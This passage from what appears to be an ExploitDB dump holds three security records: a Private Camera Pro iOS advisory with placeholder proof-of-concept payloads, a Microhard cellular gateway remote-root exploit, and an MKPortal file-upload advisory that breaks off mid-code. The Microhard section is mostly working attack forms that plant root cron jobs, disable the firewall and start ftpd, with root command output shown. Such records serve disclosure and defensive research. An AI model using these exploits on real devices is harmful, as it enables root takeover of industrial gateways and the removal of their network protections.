Level:\r\n===============\r\nHigh\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\n1.1\r\nA local file include vulnerability has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.\r\nThe local file include web vulnerability allows remote attackers to unauthorized include local file/path requests \r\nor system specific path commands to compromise the web-application/device.\r\n\r\nThe vulnerability is located in the upload module of the mobile web-application web-interface. Remote attackers can \r\nmanipulate the `upload > submit` POST method request with the vulnerable `filename` value to compromise the application \r\nor connected device components. The issue allows remote attackers to include local app path values or wifi web-server files. \r\n\r\nThe exploitation appears on the application-side and the inject request method is POST. The exection occurs in the main index \r\nfile dir list. The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability \r\nscoring system) count of 7.2(+)|(-)7.3.\r\n\r\nExploitation of the local file include vulnerability requires no user interaction or privileged mobile application user account. \r\nSuccessful exploitation of the file include web vulnerability results in mobile application compromise, connected device compromise \r\nor web-server compromise.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] POST\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Upload (UI) & Import (Device Sync)\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] filename\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] File Dir Index Listing\r\n\r\n\r\n1.2\r\nA local command/path injection web vulnerabilities has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.\r\nA command inject vulnerability allows attackers to inject local commands via vulnerable system values to compromise the apple mobile iOS application.\r\n\r\nThe vulnerability is located in the vulnerable `[devicename] (srvName)` value of the device-info module. Local attackers are able to inject own malicious \r\nsystem specific commands or path value requests as the physical iOS hardware devicename. The execution of the injected command or path request occurs with \r\npersistent attack vector in the device-info listing module of the web interface. The security risk of the local command/path inject vulnerability is estimated \r\nas high(-) with a cvss (common vulnerability scoring system) count of 6.5(+)|(-)6.6.\r\n\r\nExploitation of the command/path inject vulnerability requires a low privileged iOS device account with restricted access and no user interaction. \r\nSuccessful exploitation of the vulnerability results in unauthorized execution of system specific commands and unauthorized path value requests to \r\ncompromise the mobile iOS application or the connected device components.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] POST\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Content > header-title\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t[+] devicename\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] Index- File Dir Listing\r\n\t\t\t\t[+] Sub Folder/Category - File Dir Listing\r\n\r\n\r\n\r\n1.3\r\nA persistent input validation vulnerability has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.\r\nA persistent input validation vulnerability allows remote attackers to inject own malicious script codes on the application-side \r\nof the affected application web-server.\r\n\r\nThe vulnerability is located in the add `New Album` input field. The vulnerability allows remote attackers to inject \r\nown malicious script codes on the application-side of the index path/folder listing. The script code execute occurs \r\nin the index `Albums Index` listing with the vulnerable album_title parameter. The inject can be done local by the device \r\nvia add album sync function or remote by an inject via upload in the web-interface. The attack vector is persistent and \r\nthe injection request method is POST. The security risk of the persistent input validation web vulnerability in the \r\nalbumtitle value is estimated as high(-) with a cvss (common vulnerability scoring system) count of 4.2(+)|(-)4.3.\r\n\r\nExploitation of the persistent script code inject vulnerability via POST method request requires low user interaction \r\nand no privileged web-interface user account. Only the sync add album sync function of the reproduce via device requires \r\nphysical access.\r\n\r\nRequest Method(s):\r\n\t\t\t\t[+] POST\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Albums Add (UI) & Import (Snyc Device)\r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] album_title\r\n\r\nAffected Module(s):\r\n\t\t\t\t[+] Album Index & Sub Category Index\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\n1.1\r\nthe local file include web vulnerability can be exploited by remote attackers without privileged web-application user account or \r\nuser interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.\r\n\r\nPoC: Albums\r\n\r\n<div class="btn btn-mini directDownload" title="Download photo">Download</div></div></li><li class="span2 thumbnail_warp">\r\n<div class="thumbnail_image"><a href="http://192.168.2.109/origins/PC_20140223160359211.jpg" class="thumbnail" w="480" h="320" \r\nt="0" u="PC_20140223160359211.jpg"><img style="display: block;" src="Default%20Album_filename-Dateien/PC_20140223160359211.jpg" \r\ndata-original="/photos/thumbnails/PC_20140223160359211.jpg" class="photo_image"><div class="inner_icons"> </div></a>\r\n<div class="thumbnail_overlay"><img style="display: none;" src="Default%20Album_filename-Dateien/zoomout_icon.png" \r\nclass="zoomout_icon" title="origin photo"></div></div><div style="display: none;" class="photo-edit-bar"><label class="checkbox inline">15<input \r\nid="15" name="0" value="./[LOCAL FILE INCLUDE VULNERABILITY!].jpg" type="checkbox"></label><div class="btn btn-mini directDownload" \r\ntitle="Download photo">Download</div></div></li></ul></div>\r\n\r\n\r\n--- PoC Session Logs [POST] ---\r\nStatus: 200[OK]\r\nPOST http://localhost/asset/addAsset Load Flags[LOAD_BYPASS_CACHE  ] Gr\xf6\xdfe des Inhalts[462] Mime Type[application/json]\r\n   Request Header:\r\n      Host[localhost]\r\n      User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0]\r\n      Accept[application/json, text/javascript, */*; q=0.01]\r\n      Accept-Language[de-de,de;q=0.8,en-us;q=0.5,en;q=0.3]\r\n      Accept-Encoding[gzip, deflate]\r\n      X-Requested-With[XMLHttpRequest]\r\n      Referer[http://localhost/]\r\n      Content-Length[24791]\r\n      Content-Type[multipart/form-data; boundary=---------------------------27557158176485]\r\n      Connection[keep-alive]\r\n      Pragma[no-cache]\r\n      Cache-Control[no-cache]\r\n   POST-Daten:\r\n      POST_DATA[-----------------------------27557158176485\r\nContent-Disposition: form-data; name="params"\r\n\r\nname:Default%20Album|url:82A29591-4E94-4313-B4A6-B527A1A551AE|id:SYS_ALBUM_DEFAULT\r\n-----------------------------27557158176485\r\nContent-Disposition: form-data; name="files[]"; filename="./[LOCAL FILE INCLUDE VULNERABILITY!]"\r\nContent-Type: image/jpeg\r\n\r\n\r\n\r\n1.2\r\nThe local command inject web vulnerability can be exploited by remote attackers with physical device access and without user interaction.\r\nFor security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.\r\n\r\n\r\nPoC: Device Info > device_info_list > srvname > device-info > [devicename] (srvName)\r\n\r\n<div aria-hidden="false" style="display: block;" id="modal_serverInfo" class="modal hide fade in">\r\n    <div class="modal-header">\r\n        <a class="close" data-dismiss="modal">\xd7</a>\r\n        <h4>Device info</h4>\r\n    </div>\r\n    <div class="modal-body">\r\n         <ul class="device_info_list">\r\n            <li>Name:<span id="srvName" class="device-info">bkm337\xa5"><%20"./[LOCAL COMMAND INJECT VULNERABILITY!]"><if></span></li>\r\n            <li>Model:<span id="srvModel" class="device-info">iPad 4 (WiFi)</span></li>\r\n            <li>iOS Version:<span id="srvVer" class="device-info">7.0.6</span></li>\r\n            <li>Free Space:<span id="srvFree" class="device-info">9.993 GB</span></li>\r\n            <li>Support Video:<span id="srvSupported" class="device-info">MOV, M4V, MP4</span></li>\r\n        </ul>\r\n    </div>\r\n    <div class="modal-footer">\r\n        <a href="#" class="btn" data-dismiss="modal">Close</a>\r\n    </div>\r\n</div>\r\n\r\nNote: Inject your payload as iOS devicename (phone or ipad). The execution occurs in the device-info section of the web-interface.\r\n\r\n\r\n\r\n\r\n1.2\r\nThe persistent input validation web vulnerability can be exploited by remote attackers with low privileged application user account and \r\nlow user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.\r\n\r\n\r\nPoC: File Dir Index >  album_title\r\n\r\n<div class="span12 content-body index_page" id="indexDropbox"><ul class="thumbnails" id="albums"><li class="album_warp">\r\n<a href="#" n="Default%20Album" u="SYS_ALBUM_DEFAULT" albumtype="1" editable="true" class="thumbnail thumbnailAlbum">\r\n<img src="Albums_foldername-Dateien/SYS_ALBUM_DEFAULT.jpg" class="album_image"><h5 class="album_title">Default Album</h5>\r\n<p class="album_desc 1">15 Photos</p></a></li><li class="album_warp"><a href="#" n="%20">[PERSISTENT INJECTED SCRIPT CODE!]" \r\nu="E2569E17-2254-46D9-992C-82833B92F535" albumtype="0" editable="true" class="thumbnail thumbnailAlbum">\r\n<img src="Albums_foldername-Dateien/E2569E17-2254-46D9-992C-82833B92F535.jpg" class="album_image">\r\n<h5 class="album_title">><%20">[PERSISTENT INJECTED SCRIPT CODE!]">  "><%20">[PERSISTENT INJECTED SCRIPT CODE!]></h5>\r\n<p class="album_desc 0">7 Photos</p></a></li></iframe></h5></a></li></ul></div>\r\n\r\nNote: Use the sync function when processing to import to inject the persistent code to the file dir index of the web-interface.\r\n\r\n\r\n\r\nSolution - Fix & Patch:\r\n=======================\r\n1.1\r\nThe local file include web vulnerability can be patched by a secure parse and validation of the filename value in the upload file POst method request.\r\n\r\n1.2\r\nThe local command inject web vulnerability can be fixed by a secure encode of the vulnerable devicename value in the service information module.\r\n\r\n1.3\r\nThe persistent input validation web vulnerability can be patched by a secure parse and encode of the vulnerable albumname value.\r\nRestrict the albumname add and rename function to prevent further persistent script code injects via POST method request.\r\n\r\n\r\nSecurity Risk:\r\n==============\r\n1.1\r\nThe security risk of the local file include web vulnerability is estimated as high(+).\r\n\r\n1.2\r\nThe security risk of the local command inject web vulnerability is estimated as high(-).\r\n\r\n1.3\r\nThe security risk of the persistent input validation web vulnerability is estimated as medium(+).\r\n\r\n\r\nCredits & Authors:\r\n==================\r\nVulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@evolution-sec.com) [www.vulnerability-lab.com]\r\n\r\n\r\nDisclaimer & Information:\r\n=========================\r\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, \r\neither expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-\r\nLab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business \r\nprofits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some \r\nstates do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation \r\nmay not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases \r\nor trade with fraud/stolen material.\r\n\r\nDomains:    www.vulnerability-lab.com   \t- www.vuln-lab.com\t\t\t       - www.evolution-sec.com\r\nContact:    admin@vulnerability-lab.com \t- research@vulnerability-lab.com \t       - admin@evolution-sec.com\r\nSection:    www.vulnerability-lab.com/dev \t- forum.vulnerability-db.com \t\t       - magazine.vulnerability-db.com\r\nSocial:\t    twitter.com/#!/vuln_lab \t\t- facebook.com/VulnerabilityLab \t       - youtube.com/user/vulnerability0lab\r\nFeeds:\t    vulnerability-lab.com/rss/rss.php\t- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php\r\n\r\nAny modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. \r\nPermission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other \r\nmedia, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and \r\nother information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), \r\nmodify, use or edit our material contact (admin@vulnerability-lab.com or research@vulnerability-lab.com) to get a permission.\r\n\r\n\t\t\t\tCopyright \xa9 2014 | Vulnerability Laboratory [Evolution Security]\r\n\r\n\r\n\r\n-- \r\nVULNERABILITY LABORATORY RESEARCH TEAM\r\nDOMAIN: www.vulnerability-lab.com\r\nCONTACT: research@vulnerability-lab.com', u'description': u'Private Camera Pro 5.0 iOS - Multiple Vulnerabilities', u'platform': u'ios', u'author': u'Vulnerability-Lab', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-02-25T00:00:00+00:00', u'_id': 31900, u'type': u'webapps', u'port': 0}

CVE: []
Description: Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway - Remote Root
{u'code': u'Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway Remote Root Exploit\r\n\r\n\r\nVendor: Microhard Systems Inc.\r\nProduct web page: http://www.microhardcorp.com\r\nAffected version: IPn4G 1.1.0 build 1098\r\n                  IPn3Gb 2.2.0 build 2160\r\n                  IPn4Gb 1.1.6 build 1184-14\r\n                  IPn4Gb 1.1.0 Rev 2 build 1090-2\r\n                  IPn4Gb 1.1.0 Rev 2 build 1086\r\n                  Bullet-3G 1.2.0 Rev A build 1032\r\n                  VIP4Gb 1.1.6 build 1204\r\n                  VIP4G 1.1.6 Rev 3.0 build 1184-14\r\n                  VIP4G-WiFi-N 1.1.6 Rev 2.0.0 build 1196\r\n                  IPn3Gii / Bullet-3G 1.2.0 build 1076\r\n                  IPn4Gii / Bullet-LTE 1.2.0 build 1078\r\n                  BulletPlus 1.3.0 build 1036\r\n                  Dragon-LTE 1.1.0 build 1036\r\n\r\nSummary: The new IPn4Gb provides a rugged, industrial strength wireless solution\r\nusing the new and ultra fast 4G LTE cellular network infrastructure. The IPn4Gb\r\nfeatures integrated Firewall, IPSec / VPN & GRE Tunneling, IP/MAC Access Control\r\nLists. The IPn4Gb can transport critical data to and from SMS, Ethernet and Serial\r\nRS232/485/422 devices!\r\n\r\nThe IPn3Gb provides a fast, secure industrial strength wireless solution that uses\r\nthe widespread deployment of cellular network infrastructure for critical data collection.\r\nFrom remote meters and sensors, to providing mobile network access, the IPn3Gb delivers!\r\nThe IPn3Gb is a powerful HSPA+ and Quad Band GSM device compatible almost anywhere. It\r\nprovides robust and secure wireless communication of Serial, USB and Ethernet data.\r\n\r\nThe all new Bullet-3G provides a compact, robust, feature packed industrial strength\r\nwireless solution using fast 3G/HSPA+ network infrastructure. The Bullet-3G takes things\r\nto the next level by providing features such as Ethernet with PoE, RS232 Serial port\r\nand 2x Programmable I/O. Offering enhanced, \'Secure Communication\' with its integrated\r\nFirewall, IPSec VPN Tunneling, IP/MAC Access Control Lists, the Bullet-3G is a solution\r\nworth looking at!\r\n\r\nThe all new Dragon-LTE provides a feature packed, compact OEM, industrial strength\r\nwireless IoT & M2M solution. Connect any device, wired or wireless, and provide remote\r\ncellular access using the Dragon-LTE. The Dragon-LTE features a OEM design for tight\r\nsystem integration and design flexibility with dual Ethernet Ports and high power\r\n802.11b/g/n WIFI. With its integrated Firewall, IPSec VPN Tunneling and IP/MAC Access\r\nControl Lists, the Dragon-LTE provides a solution for any cellular application!\r\n\r\nThe new VIP4Gb provides a rugged, industrial strength wireless solution using 4G LTE\r\nnetwork infrastructure for critical data communications. The VIP4Gb provides simultaneous\r\nnetwork connections for 802.11a/b/g/n WiFi devices, 4 x 10/100/1000 Ethernet ports, Digital\r\nI/O, and a RS232/RS485 port, resulting in a communication device that can be deployed in\r\nany application! The VIP4Gb is a powerful 4G LTE device compatible on any cellular network.\r\nIt provides robust and secure wireless communication of Serial, Ethernet & WiFi data.\r\n\r\nDesc: The application suffers from multiple authenticated arbitrary remote code execution\r\nvulnerabilities with highest privileges. This is due to multiple hidden and undocumented\r\nfeatures within the admin interface that allows an attacker to create crontab jobs and/or\r\nmodify the system startup script that allows execution of arbitrary code as root user.\r\n\r\nTested on: httpd-ssl-1.0.0\r\n           Linux 2.6.32.9 (Bin@DProBuilder) (gcc version 4.4.3)\r\n\r\n\r\nVulnerability discovered by Gjoko \'LiquidWorm\' Krstic\r\n                            @zeroscience\r\n\r\n\r\nAdvisory ID: ZSL-2018-5479\r\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5479.php\r\n\r\n\r\n13.03.2018\r\n\r\n--\r\n\r\n\r\nCrontab #1:\r\n-----------\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">\r\n      <input type="hidden" name="submit" value="1" />\r\n      <input type="hidden" name="sltMinutes" value="" />\r\n      <input type="hidden" name="sltHours" value="" />\r\n      <input type="hidden" name="sltDays" value="" />\r\n      <input type="hidden" name="sltMonths" value="" />\r\n      <input type="hidden" name="sltDaysOfWeek" value="" />\r\n      <input type="hidden" name="txthMinutes" value="" />\r\n      <input type="hidden" name="txthHours" value="" />\r\n      <input type="hidden" name="txthDays" value="" />\r\n      <input type="hidden" name="txthMonths" value="" />\r\n      <input type="hidden" name="txthDaysOfWeek" value="" />\r\n      <input type="hidden" name="ddEveryXminute" value="" />\r\n      <input type="hidden" name="ddEveryXhour" value="" />\r\n      <input type="hidden" name="ddEveryXday" value="" />\r\n      <input type="hidden" name="txtCommand" value="" />\r\n      <input type="hidden" name="txthCronEnabled" value="0" />\r\n      <input type="hidden" name="txtCrontabEntry" value="" />\r\n      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />\r\n      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />\r\n      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />\r\n      <input type="hidden" name="MINUTES_cfg04b4e9" value="*" />\r\n      <input type="hidden" name="HOURS_cfg04b4e9" value="*" />\r\n      <input type="hidden" name="DAYS_cfg04b4e9" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg04b4e9" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg04b4e9" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg04b4e9" value="id > /www/pwn.txt" />\r\n      <input type="hidden" name="ENABLED_cfg04b4e9" value="1" />\r\n      <input type="hidden" name="MINUTES_newCron" value="" />\r\n      <input type="hidden" name="HOURS_newCron" value="" />\r\n      <input type="hidden" name="DAYS_newCron" value="" />\r\n      <input type="hidden" name="MONTHS_newCron" value="" />\r\n      <input type="hidden" name="WEEKDAYS_newCron" value="" />\r\n      <input type="hidden" name="COMMAND_newCron" value="" />\r\n      <input type="hidden" name="ENABLED_newCron" value="" />\r\n      <input type="hidden" name="action" value="Save Changes" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n---\r\n\r\ncurl http://192.168.1.1/pwn.txt\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\n\r\nStart ftpd:\r\n-----------\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://192.168.1.1/cgi-bin/webif/system-startup.sh" method="POST" enctype="multipart/form-data">\r\n      <input type="hidden" name="path" value="/etc/init.d" />\r\n      <input type="hidden" name="edit" value="custom-user-startup" />\r\n      <input type="hidden" name="filecontent" value="#!/bin/sh /etc/rc.common\r\nSTART=90\r\n# place your own startup commands here\r\n#\r\n# REMEMBER: You *MUST* place an \'&\' after launching programs you \r\n#   that are to continue running in the background.\r\n#\r\n#   i.e. \r\n#   BAD:  upnpd\r\n#   GOOD: upnpd &\r\n# \r\n# Failure to do this will result in the startup process halting\r\n# on this file and the diagnostic light remaining on (at least\r\n# for WRT54G(s) models).\r\n#\r\n\r\nftpd &\r\n\r\n" />\r\n      <input type="hidden" name="save" value="\xc2\xa0Save Changes\xc2\xa0" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n\r\nCrontab #2:\r\n-----------\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">\r\n      <input type="hidden" name="submit" value="1" />\r\n      <input type="hidden" name="sltMinutes" value="" />\r\n      <input type="hidden" name="sltHours" value="" />\r\n      <input type="hidden" name="sltDays" value="" />\r\n      <input type="hidden" name="sltMonths" value="" />\r\n      <input type="hidden" name="sltDaysOfWeek" value="" />\r\n      <input type="hidden" name="txthMinutes" value="*" />\r\n      <input type="hidden" name="txthHours" value="*" />\r\n      <input type="hidden" name="txthDays" value="*" />\r\n      <input type="hidden" name="txthMonths" value="*" />\r\n      <input type="hidden" name="txthDaysOfWeek" value="*" />\r\n      <input type="hidden" name="ddEveryXminute" value="" />\r\n      <input type="hidden" name="ddEveryXhour" value="" />\r\n      <input type="hidden" name="ddEveryXday" value="" />\r\n      <input type="hidden" name="txtCommand" value="uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />\r\n      <input type="hidden" name="chkCronEnabled" value="on" />\r\n      <input type="hidden" name="txthCronEnabled" value="1" />\r\n      <input type="hidden" name="txtCrontabEntry" value="* * * * * uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />\r\n      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />\r\n      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />\r\n      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />\r\n      <input type="hidden" name="MINUTES_cfg0421ec" value="*" />\r\n      <input type="hidden" name="HOURS_cfg0421ec" value="*" />\r\n      <input type="hidden" name="DAYS_cfg0421ec" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg0421ec" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg0421ec" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg0421ec" value="uname -a >/www/os.txt ; ls -la /www >> /www/os.txt ; id >> /www/os.txt" />\r\n      <input type="hidden" name="ENABLED_cfg0421ec" value="1" />\r\n      <input type="hidden" name="MINUTES_newCron" value="" />\r\n      <input type="hidden" name="HOURS_newCron" value="" />\r\n      <input type="hidden" name="DAYS_newCron" value="" />\r\n      <input type="hidden" name="MONTHS_newCron" value="" />\r\n      <input type="hidden" name="WEEKDAYS_newCron" value="" />\r\n      <input type="hidden" name="COMMAND_newCron" value="" />\r\n      <input type="hidden" name="ENABLED_newCron" value="" />\r\n      <input type="hidden" name="action" value="Save Changes" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>\r\n\r\n---\r\n\r\ncurl http://192.168.1.1/os.txt\r\nLinux IPn4G 2.6.32.9 #1 Mon Jun 20 15:28:30 MDT 2016 mips GNU/Linux\r\ndrwxr-xr-x    5 root     root            0 Jul  1 14:01 .\r\ndrwxr-xr-x    7 root     root            0 Dec 31  1969 ..\r\n-rw-r--r--    1 root     root            4 Apr 12  2010 .version\r\n-rw-r--r--    1 root     root        13461 May  8 15:54 IPn4G.config\r\ndrwxr-xr-x    3 root     root            0 Jun 20  2016 cgi-bin\r\n-rw-r--r--    1 root     root         2672 Apr  1  2010 colorize.js\r\n-rwxr-xr-x    1 root     root         3638 May 10  2010 favicon.ico\r\ndrwxr-xr-x    2 root     root          959 Jun 20  2016 images\r\n-rw-r--r--    1 root     root          600 Feb 12  2013 index.html\r\ndrwxr-xr-x    2 root     root          224 Jun 20  2016 js\r\n-rw-r--r--    1 root     root           68 Mar  1 14:09 os.txt\r\ndrwxr-xr-x    2 root     root           79 Jun 20  2016 svggraph\r\ndrwxr-xr-x    2 root     root            0 Jul  1 14:02 themes\r\ndrwxr-xr-x    2 root     root            0 May  8 16:21 vnstat\r\n-rw-r--r--    1 root     root          953 Apr  1  2010 webif.js\r\nuid=0(root) gid=0(root) groups=0(root)\r\n\r\n\r\nDisable firewall:\r\n-----------------\r\n\r\n<html>\r\n  <body>\r\n    <form action="http://192.168.1.1/cgi-bin/webif/system-crontabs.sh" method="POST" enctype="multipart/form-data">\r\n      <input type="hidden" name="submit" value="1" />\r\n      <input type="hidden" name="sltMinutes" value="" />\r\n      <input type="hidden" name="sltHours" value="" />\r\n      <input type="hidden" name="sltDays" value="" />\r\n      <input type="hidden" name="sltMonths" value="" />\r\n      <input type="hidden" name="sltDaysOfWeek" value="" />\r\n      <input type="hidden" name="txthMinutes" value="*" />\r\n      <input type="hidden" name="txthHours" value="*" />\r\n      <input type="hidden" name="txthDays" value="*" />\r\n      <input type="hidden" name="txthMonths" value="*" />\r\n      <input type="hidden" name="txthDaysOfWeek" value="*" />\r\n      <input type="hidden" name="ddEveryXminute" value="" />\r\n      <input type="hidden" name="ddEveryXhour" value="" />\r\n      <input type="hidden" name="ddEveryXday" value="" />\r\n      <input type="hidden" name="txtCommand" value="/etc/init.d/firewall stop" />\r\n      <input type="hidden" name="chkCronEnabled" value="on" />\r\n      <input type="hidden" name="txthCronEnabled" value="1" />\r\n      <input type="hidden" name="txtCrontabEntry" value="* * * * * /etc/init.d/firewall stop" />\r\n      <input type="hidden" name="MINUTES_cfg02e2c8" value="*/3" />\r\n      <input type="hidden" name="HOURS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="DAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg02e2c8" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg02e2c8" value="/etc/init.d/ntpclient start" />\r\n      <input type="hidden" name="ENABLED_cfg02e2c8" value="1" />\r\n      <input type="hidden" name="MINUTES_cfg04f65b" value="*" />\r\n      <input type="hidden" name="HOURS_cfg04f65b" value="*" />\r\n      <input type="hidden" name="DAYS_cfg04f65b" value="*" />\r\n      <input type="hidden" name="MONTHS_cfg04f65b" value="*" />\r\n      <input type="hidden" name="WEEKDAYS_cfg04f65b" value="*" />\r\n      <input type="hidden" name="COMMAND_cfg04f65b" value="/etc/init.d/firewall stop" />\r\n      <input type="hidden" name="ENABLED_cfg04f65b" value="1" />\r\n      <input type="hidden" name="MINUTES_newCron" value="" />\r\n      <input type="hidden" name="HOURS_newCron" value="" />\r\n      <input type="hidden" name="DAYS_newCron" value="" />\r\n      <input type="hidden" name="MONTHS_newCron" value="" />\r\n      <input type="hidden" name="WEEKDAYS_newCron" value="" />\r\n      <input type="hidden" name="COMMAND_newCron" value="" />\r\n      <input type="hidden" name="ENABLED_newCron" value="" />\r\n      <input type="hidden" name="action" value="Save Changes" />\r\n      <input type="submit" value="Submit request" />\r\n    </form>\r\n  </body>\r\n</html>', u'description': u'Microhard Systems 3G/4G Cellular Ethernet and Serial Gateway - Remote Root', u'platform': u'hardware', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-07-17T00:00:00+00:00', u'_id': 45038, u'type': u'webapps', u'port': 0}

CVE: []
Description: MKPortal 1.2.1 - Multiple Vulnerabilities
{u'code': u'[waraxe-2009-SA#070] - Multiple Vulnerabilities in MKPortal <= 1.2.1\r\n==============================================================================\r\n\r\nAuthor: Janek Vind "waraxe"\r\nDate: 15. January 2009\r\nLocation: Estonia, Tartu\r\nWeb: http://www.waraxe.us/advisory-70.html\r\n\r\n\r\nDescription of vulnerable software:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nMKPortal is a free Portal/Content Management System (CMS) which seamlessly\r\nintegrates with the most popular forum softwares. It uses the forum user\r\nmanagement system and other features and adds many powerful modules to create\r\nand manage a light but powerful web site. MKPortal has an intuitive user\r\ninterface and is very simple to install and administer.\r\n\r\nHomepage: http://www.mkportal.it/\r\n\r\n\r\nList of found vulnerabilities\r\n===============================================================================\r\n\r\n1. Insecure file upload in blog personal gallery\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: critical\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. attacker must have blog editing privileges\r\n\r\nRegistered users with blog keeping privileges can access personal gallery\r\nfunctionality, example URL:\r\n\r\nhttp://localhost/mkportal.1.2.1/index.php?ind=blog&op=p_gal\r\n\r\nThey can also upload image files to the server. File uploading can be\r\ndangerous without proper security checks. So let\'s have a closer look\r\nat the source code of "modules/blog/index.php" line ~2452: \r\n\r\n---------------------[source code]---------------------\r\nfunction upload_imm () {\r\n\t\tglobal $mkportals, $DB, $mklib, $Skin, $_FILES;\r\n\r\n..\r\n\t\t$file =  $_FILES[\'FILE_UPLOAD\'][\'tmp_name\'];\r\n\t\t$file_name =  $_FILES[\'FILE_UPLOAD\'][\'name\'];\r\n\t\t//$file_type =  $_FILES[\'FILE_UPLOAD\'][\'type\'];\r\n\t\t$peso =  $_FILES[\'FILE_UPLOAD\'][\'size\'];\t\t\r\n\t\t\r\n\t\tif (!$file) {\r\n\t\t\t$message = "{$mklib->lang[\'b_compfile\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n\r\n\t\t//Validate file extension\r\n\t\t$file_ext = preg_replace("`.*\\.(.*)`", "\\\\1", $file_name);\r\n\t\t$file_ext = substr ($file_name, (strlen($file_name)-3), 3);\r\n\t\t$file_ext = strtolower($file_ext);\r\n\r\n\t\tswitch($file_ext)\r\n\t\t{\r\n\t\t\tcase \'gif\':\r\n\t\t\t\t$ext = \'gif\';\r\n\t\t\t\tbreak;\r\n\t\t\tcase \'jpg\':\r\n\t\t\t\t$ext = \'jpg\';\r\n\t\t\t\tbreak;\r\n\t\t\tcase \'png\':\r\n\t\t\t\t$ext = \'png\';\r\n\t\t\t\tbreak;\r\n\t\t\tcase \'tif\':\r\n\t\t\t\t$ext = \'tif\';\r\n\t\t\t\tbreak;\r\n\t\t\tcase \'bmp\':\r\n\t\t\t\t$ext = \'bmp\';\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\t$ext = 